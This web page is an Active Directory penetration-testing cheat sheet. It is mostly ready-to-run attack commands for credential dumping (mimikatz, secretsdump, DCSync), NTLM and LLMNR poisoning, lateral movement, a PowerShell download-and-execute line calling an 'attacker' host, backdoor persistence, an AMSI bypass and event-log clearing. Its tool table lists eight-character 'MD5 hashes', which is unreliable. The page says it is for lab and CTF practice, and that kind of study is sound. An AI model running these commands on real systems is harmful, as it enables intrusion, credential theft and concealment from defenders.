# Active Directory Penetration Testing - Basics to Advance

> A comprehensive, step-by-step guide to Active Directory attacks—from beginner concepts to advanced exploitation—equipping you with practical skills, tools, and techniques essential for real-world penetration testing, red teaming, and security analysis.
<div class="ad-module">

## 🧭 Objectives

You will Learn:

- AD core concepts
- Recon and enumeration
- Gaining and abusing credentials
- Movement and escalation
- Attacking Kerberos, trusts, and related systems
- Post-exploitation, evasion, and cleanup
- A Full Mind map of AD Hacking
</div>

<div class="ad-module">

## 🧱 Phase 1: Active Directory Basics

**Definition:** Active Directory (AD) is Microsoft’s centralized domain management system that authenticates and authorizes users and computers.

**Core Components:**

- **Domain Controllers (DCs):** Store the AD database and handle authentication
- **Domains, Forests, Trees:** Logical structures for organizing resources
- **Organizational Units (OUs):** Containers for grouping users, computers
- **Group Policy Objects (GPOs):** Define rules and security settings

**Protocols & Services:**

- **Kerberos & NTLM** for authentication
- **LDAP** for querying the directory
- **DNS, SMB, RPC** for communication

</div>

<div class="ad-module">

## 🛰️ Phase 2: Reconnaissance Phase

**Goal:** Map the network and identify live hosts/services.

**Tools:** netdiscover, nmap, nbtscan, masscan

```bash
netdiscover -i eth0
nmap -sP 192.168.1.0/24
masscan 192.168.1.0/24 -p1-65535 --rate=10000
nbtscan 192.168.1.0/24
```

</div>

<div class="ad-module">

## 🔍 Phase 3: Enumeration Phase

**Goal:** Discover domain details—users, shares, GPOs, etc.

**Tools:** enum4linux, smbclient, ldapsearch, rpcclient, BloodHound, ADExplorer

```bash
enum4linux -a 192.168.1.100
smbclient -L \\192.168.1.100 -N
ldapsearch -x -H ldap://192.168.1.100 -b "dc=domain,dc=local"
```

</div>

<div class="ad-module">

## 🚪 Phase 4: Initial Access

**Goal:** Obtain a foothold using weak auth or misconfig.

**Techniques:** AS-REP Roasting, NTLM Relay, LLMNR Poisoning

```bash
GetNPUsers.py domain.local/ -no-pass -usersfile users.txt -dc-ip 192.168.1.100
responder -I eth0
mitm6 -i eth0

```

</div>

<div class="ad-module">

## 🔐 Phase 5: Credential Access

**Goal:** Extract passwords, hashes, and tickets.

**Tools:** mimikatz, secretsdump, pypykatz

```bash
mimikatz > sekurlsa::logonpasswords
secretsdump.py domain/user:pass@192.168.1.100

```

</div>

<div class="ad-module">

## 📡 Phase 6: Lateral Movement

**Goal:** Move to other systems after initial access.

**Tools:** wmiexec, psexec, crackmapexec

```bash
wmiexec.py domain/user:pass@192.168.1.101
psexec.py domain/user:pass@192.168.1.101

```

</div>

<div class="ad-module">

## 📈 Phase 7: Privilege Escalation

**Goal:** Escalate local user to SYSTEM or Domain Admin.

**Tools:** winPEAS, PowerUp, Seatbelt

```bash
winPEAS.exe
powershell -ep bypass -Command "IEX (New-Object Net.WebClient).DownloadString('http://attacker/PowerUp.ps1'); Invoke-AllChecks"

```

</div>

<div class="ad-module">

## 🧲 Phase 8: Persistence Techniques

**Goal:** Maintain long-term access.

```powershell
net user attacker P@ssw0rd /add
net localgroup administrators attacker /add
schtasks /create /tn "Backdoor" /tr "cmd.exe /c whoami >> C:\backdoor.txt" /sc minute /mo 5

```

</div>

<div class="ad-module">

## 🎭 Phase 9: Kerberos Attacks

**Goal:** Abuse ticketing mechanisms.

**Tools:** Rubeus, GetUserSPNs, hashcat

```bash
GetUserSPNs.py domain/user:pass -dc-ip 192.168.1.100
hashcat -m 13100 hashes.txt rockyou.txt --force

```

</div>

<div class="ad-module">

## 🏛️ Phase 10: Domain Escalation

**Goal:** Gain Domain Admin or take over trusts.

```bash
lsadump::dcsync /domain:domain.local /user:Administrator
Invoke-ACLScanner
Invoke-AddComputer

```

</div>

<div class="ad-module">

## 🧾 Phase 11: Post-Exploitation

**Goal:** Data collection, pivoting, intel gathering.

```bash
findstr /S /I cpassword \\dc\sysvol
LaZagne.exe browsers

```

</div>

<div class="ad-module">

## 🕵️ Phase 12: Defense Evasion

**Goal:** Avoid detection during attacks.

```powershell
Clear-EventLog -LogName Security
[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)

```

</div>

<div class="ad-module">

## 🧹 Phase 13: Cleanup

**Goal:** Remove traces post-assessment.

```powershell
net user attacker /del
schtasks /delete /tn "Backdoor"
Clear-EventLog -LogName System

```

</div>

<div class="ad-module">

## 🖧 Phase 14: Connected System Attacks

**Exchange:**

```powershell
Invoke-SelfSearch -Mailbox user@domain.local -SearchQuery 'password'

```

**SCCM:** Abuse deployment paths or extract config.

**ADFS:** Golden SAML, token forging

</div>

## 🧪 Tools & References

| Tool | Use | MD5 Hash |
| --- | --- | --- |
| Mimikatz | Dump credentials | b72868aa |
| BloodHound | AD relationship mapping | 358a13fe |
| Impacket | Remote command & Kerberos | 8102db6b |
| CrackMapExec | Lateral movement and enum | 118802fb |
| Responder | LLMNR spoof | 34bdf2dc |
| PEASS-ng | Privesc check | a1074bbf |
| PowerSploit | PowerShell recon/privesc | 473d90f6 |



## 🧠 Advanced: Active Directory Mind Map

<a href="/assets/img/pentest_ad_dark_2022_11.svg" target="_blank" onclick="window.open(this.href, '_blank'); return false;" style="display:inline-block;padding:10px 20px;font-size:1.1em;margin-bottom:15px;background:#2d7ff9;color:#fff;text-decoration:none;border:none;border-radius:5px;cursor:pointer;">Open Mind Map</a>
<script type="text/javascript">
  document.addEventListener('DOMContentLoaded', function() {
    var links = document.querySelectorAll('a[href$="pentest_ad_dark_2022_11.svg"]');
    links.forEach(function(link) {
      link.addEventListener('click', function(e) {
        e.preventDefault();
        var win = window.open('', '_blank');
        win.document.write('<html><head><title>Active Directory Mind Map</title></head><body style="margin:0;background:#222;display:flex;align-items:center;justify-content:center;height:100vh;"><img src="' + link.href + '" style="width:33vw;height:auto;max-width:none;box-shadow:0 2px 8px rgba(0,0,0,0.2);background:#fff;border-radius:8px;" /></body></html>');
      });
    });
  });
</script>

## ✅ You're Ready!

Use this cheat sheet to practice on your lab and in CTFs. Let me know if you want video walkthroughs or scripts for automation.

